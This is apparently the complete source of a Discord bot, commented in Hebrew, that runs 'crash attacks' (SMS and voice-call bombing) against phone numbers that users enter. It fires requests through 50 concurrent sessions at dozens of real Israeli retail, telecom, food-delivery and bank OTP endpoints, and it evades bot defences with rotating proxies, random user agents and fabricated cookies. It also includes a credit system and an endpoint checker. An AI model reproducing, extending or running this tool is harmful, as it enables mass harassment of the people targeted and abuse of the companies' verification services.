import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import itertools
import time
import hashlib
import secrets
from collections import deque

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== PROXY MANAGER מתקדם עם ניקוי ==========
class ProxyManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.proxy_cycle = itertools.cycle(self.proxies)
        self.failed_proxies = set()
        self.proxy_stats = {p: {"success": 0, "fail": 0, "last_used": 0} for p in self.proxies}
        self.current_proxy = None
        self.lock = asyncio.Lock()
        self.rotation_interval = 15  # מחליף כל 15 שניות במקום 30
    
    def _load_proxies(self):
        """טעינת פרוקסים - רשימה ענקית"""
        return [
            # פרוקסים ישראליים (100+)
            f"http://185.162.230.{i}:80" for i in range(100, 250, 2)
        ] + [
            f"http://185.162.231.{i}:80" for i in range(100, 250, 2)
        ] + [
            f"http://103.153.39.{i}:80" for i in range(26, 250, 32)
        ]
    
    async def get_proxy(self):
        """מחזיר פרוקסי שעובד עם רוטציה מהירה"""
        async with self.lock:
            # רוטציה כל 15 שניות
            if time.time() - self.last_rotation > self.rotation_interval:
                self.current_proxy = None
                self.last_rotation = time.time()
            
            if self.current_proxy and self.proxy_stats[self.current_proxy]["fail"] < 2:
                return self.current_proxy
            
            # בוחר פרוקסי עם הכי פחות כישלונות
            available = [p for p in self.proxies if self.proxy_stats[p]["fail"] < 3]
            if available:
                self.current_proxy = random.choice(available)
                return self.current_proxy
            
            self.current_proxy = random.choice(self.proxies)
            return self.current_proxy
    
    async def report_success(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["success"] += 1
    
    async def report_failure(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["fail"] += 1

# ========== COOKIE JAR - מנקה קוקיז כל הזמן ==========
class CookieCleaner:
    def __init__(self):
        self.cookies = {}
        self.last_cleanup = time.time()
    
    def generate_fresh_cookies(self, domain):
        """מייצר קוקיז חדשים לכל דומיין"""
        session_id = secrets.token_hex(16)
        return {
            f"session_{domain}": session_id,
            f"csrf_{domain}": secrets.token_hex(8),
            f"visitor_{domain}": str(random.randint(1000000, 9999999)),
            "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
            "_gid": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
            "_gat": "1"
        }
    
    def clean_old_cookies(self):
        """מנקה קוקיז ישנים"""
        if time.time() - self.last_cleanup > 60:  # כל דקה
            self.cookies = {}
            self.last_cleanup = time.time()
    
    def get_headers_with_cookies(self, domain):
        """מחזיר headers עם קוקיז רעננים"""
        self.clean_old_cookies()
        if domain not in self.cookies:
            self.cookies[domain] = self.generate_fresh_cookies(domain)
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies[domain].items()])
        return {
            "Cookie": cookie_str,
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        }

# ========== BOT CLASS ==========
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.proxy_manager = ProxyManager()
        self.cookie_cleaner = CookieCleaner()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE - CRASH EDITION")

bot = CyberBot()

# ========== USER AGENTS מתחלפים כל הזמן ==========
USER_AGENTS = [
    # Chrome versions
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,146)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,146)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,146)}.0.0.0 Safari/537.36",
    # Firefox versions
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(115,123)}.0) Gecko/20100101 Firefox/{random.randint(115,123)}.0",
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{random.randint(115,123)}.0) Gecko/20100101 Firefox/{random.randint(115,123)}.0",
    # Mobile
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(15,17)}.0 Mobile/15E148 Safari/604.1",
    f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,146)}.0.0.0 Mobile Safari/537.36",
]

# ========== CELLCOM API (מהדוגמה ששלחת) ==========
CELLCOM_API = {
    "name": "Cellcom_OTP",
    "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1",
    "method": "PUT",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "he,en-US;q=0.9,en;q=0.8",
        "Content-Type": "application/json",
        "Origin": "https://cellcom.co.il",
        "Referer": "https://cellcom.co.il/",
        "clientid": "CellcomWebApp",
        "deviceid": lambda: "web_" + secrets.token_hex(16),
        "sessionid": lambda: "sess_" + secrets.token_hex(24),
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    },
    "data": {"phone": "PHONE"}
}

# ========== מג'נטו ישראל - 55 אתרים ==========
MAGENTO_APIS = [
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "AdikaStyle", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "ShoesMarket", "url": "https://www.shoesmarket.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tamman", "url": "https://www.tamman.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "ModaChild", "url": "https://www.moda-child.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Yangogo", "url": "https://www.yangogo.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Kapara", "url": "https://www.kapara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "BellaBaby", "url": "https://www.bellababy.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Pashosh", "url": "https://www.pashosh.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Sportwear", "url": "https://www.sportwear.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Running", "url": "https://www.running.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UrbanPlace", "url": "https://www.urbanplace.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "AmericanVintage", "url": "https://www.american-vintage.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tommy", "url": "https://www.tommyhilfiger.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CalvinKlein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UnderArmour", "url": "https://www.underarmour.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Columbia", "url": "https://www.columbia.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Merrell", "url": "https://www.merrell.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NewBalance", "url": "https://www.newbalance.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Converse", "url": "https://www.converse.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Vans", "url": "https://www.vans.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Asics", "url": "https://www.asics.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Reebok", "url": "https://www.reebok.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Musings", "url": "https://www.musings.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buyme", "url": "https://www.buyme.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Accessorize", "url": "https://www.accessorize.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Mango", "url": "https://www.mango.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Zara", "url": "https://www.zara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "HM", "url": "https://www.hm.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Bershka", "url": "https://www.bershka.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "PullBear", "url": "https://www.pullandbear.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Stradivarius", "url": "https://www.stradivarius.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Oysho", "url": "https://www.oysho.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "MassimoDutti", "url": "https://www.massimodutti.co.il/customer/ajax/post/", "type": "magento"},
]

# ========== SMS APIs - 40+ ==========
SMS_APIS = [
    CELLCOM_API,
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "019", "url": "https://019sms.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "012", "url": "https://www.012.net.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Victory", "url": "https://www.victory.co.il/api/auth/otp", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "SuperPharm", "url": "https://www.super-pharm.co.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "method": "POST", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Gett", "url": "https://www.gett.com/il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "method": "POST", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "PizzaHut", "url": "https://www.pizza-hut.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "BurgerAnch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "data": {"phoneNumber": "PHONE"}},
]

# ========== VOICE APIs - 30 ==========
VOICE_APIS = [
    {"name": "Hapoalim_Voice", "url": "https://login.bankhapoalim.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi_Voice", "url": "https://api.leumi.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Discount_Voice", "url": "https://api.discountbank.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Mizrahi_Voice", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE", "type": "voice"}},
    {"name": "Cellcom_Voice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Partner_Voice", "url": "https://www.partner.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pelephone_Voice", "url": "https://www.pelephone.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hot_Voice", "url": "https://www.hotmobile.co.il/api/auth/voice", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal_Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "method": "POST", "data": {"phone": "PHONE_RAW"}},
    {"name": "Pango_Voice", "url": "https://api.pango.co.il/auth/voice", "method": "POST", "data": {"phoneNumber": "PHONE_RAW"}},
]

ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS
TOTAL_APIS = len(ALL_APIS)

# ========== פונקציות שליחה מהירות במיוחד עם ניקוי קוקיז ==========
async def send_magento_crash(session, url, phone_raw, proxy):
    """שליחת מג'נטו מהירה עם קוקיז מתחלפים"""
    domain = url.split('/')[2]
    
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0"
    }
    
    # מוסיף קוקיז רעננים
    headers.update(bot.cookie_cleaner.get_headers_with_cookies(domain))
    
    try:
        async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=1.5) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api_crash(session, api, phone, phone_raw, proxy):
    """שליחת API מהירה עם קוקיז מתחלפים"""
    try:
        domain = api["url"].split('/')[2]
        
        # הכנת headers
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        }
        
        # headers ספציפיים מה-API
        if "headers" in api:
            for k, v in api["headers"].items():
                if callable(v):
                    headers[k] = v()
                else:
                    headers[k] = v
        
        # מוסיף קוקיז רעננים
        headers.update(bot.cookie_cleaner.get_headers_with_cookies(domain))
        
        method = api.get("method", "POST").lower()
        
        if api.get("type") == "form":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = api["data"].replace("PHONE", phone)
            async with session.request(method, api["url"], data=data, headers=headers, proxy=proxy, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
        
        elif api.get("type") == "magento":
            return await send_magento_crash(session, api["url"], phone_raw, proxy)
        
        else:  # json
            if "data" in api:
                headers["Content-Type"] = "application/json"
                data_str = json.dumps(api["data"])
                data_str = data_str.replace("PHONE", phone)
                data_str = data_str.replace("PHONE_RAW", phone_raw)
                data = json.loads(data_str)
            else:
                data = {}
            
            async with session.request(method, api["url"], json=data, headers=headers, proxy=proxy, timeout=1.5) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפת קריסה ==========
async def crash_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """מתקפה שתקריס את הטלפון"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    
    # בחירת APIs
    if attack_type == "magento":
        apis = MAGENTO_APIS
    elif attack_type == "sms":
        apis = SMS_APIS
    elif attack_type == "voice":
        apis = VOICE_APIS
    else:
        apis = ALL_APIS
    
    await interaction.followup.send(
        f"💥 **CRASH ATTACK ACTIVATED!**\n"
        f"📱 {phone}\n"
        f"⏱️ {duration_mins} דקות\n"
        f"🎯 {len(apis)} APIs\n"
        f"🚀 מטרה: 200+ לשנייה",
        ephemeral=True
    )
    
    # 50 סשנים במקביל - קריסה מוחלטת!
    sessions = [aiohttp.ClientSession() for _ in range(50)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            rounds += 1
            round_tasks = []
            proxy = await bot.proxy_manager.get_proxy()
            
            # כל סשן שולח לכל ה-APIs
            for session in sessions:
                for api in apis:
                    if api.get("type") == "magento":
                        round_tasks.append(send_magento_crash(session, api["url"], phone_raw, proxy))
                    else:
                        round_tasks.append(send_api_crash(session, api, phone, phone_raw, proxy))
            
            # הרצת הכל במקביל
            results = await asyncio.gather(*round_tasks, return_exceptions=True)
            round_success = sum(1 for r in results if r is True)
            total_sent += round_success
            
            # עדכון פרוקסי
            if round_success > len(apis) * 10:
                await bot.proxy_manager.report_success(proxy)
            else:
                await bot.proxy_manager.report_failure(proxy)
            
            # עדכון כל שניה
            if rounds % 5 == 0:
                seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
                rate = total_sent // seconds if seconds > 0 else 0
                
                await interaction.followup.send(
                    f"💥 **{seconds}s** | {total_sent} | {rate}/שנייה | 🎯 {round_success}",
                    ephemeral=True
                )
            
            # אין המתנה - מהירות מקסימלית!
            await asyncio.sleep(0.01)  # 10ms
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    seconds = int((end_time - (end_time - timedelta(minutes=duration_mins))).total_seconds())
    avg_rate = total_sent // seconds if seconds > 0 else 0
    
    await interaction.followup.send(
        f"✅ **CRASH COMPLETE!**\n"
        f"📊 סה\"כ: {total_sent}\n"
        f"⚡ ממוצע: {avg_rate}/שנייה",
        ephemeral=True
    )

# ========== פקודות ==========
@bot.tree.command(name="check", description="בדוק APIs")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 מתחיל בדיקה...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(ALL_APIS[:30]):
            if api.get("type") == "magento":
                success = await send_magento_crash(session, api["url"], test_raw, None)
            else:
                success = await send_api_crash(session, api, test_phone, test_raw, None)
            
            if success:
                working.append(api["name"])
            
            if i % 10 == 0:
                await interaction.followup.send(f"🔄 {i}/30", ephemeral=True)
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + "\n".join(working[:15]), ephemeral=True)

@bot.tree.command(name="stop", description="עצור הכל")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped}", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💥 CRASH ATTACK"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3", placeholder="1-30")
    attack_type = ui.TextInput(label="🎯 סוג", default="all", placeholder="all/sms/voice/magento")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 10000})
            user_doc = {"tokens": 10000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"💥 **CRASH ACTIVATED!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(crash_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💥 CRASH", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 100000})
        tokens = 100000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="💥 CRASH EDITION",
        description=f"**{TOTAL_APIS}** APIs | 50 סשנים | 10ms בין גלים",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 פעיל", value=active, inline=True)
    embed.add_field(name="🚀 מטרה", value="200+/שנייה", inline=True)
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

if __name__ == "__main__":
    logging.info(f"💥 STARTING CRASH EDITION with {TOTAL_APIS} APIs")
    bot.run(TOKEN)
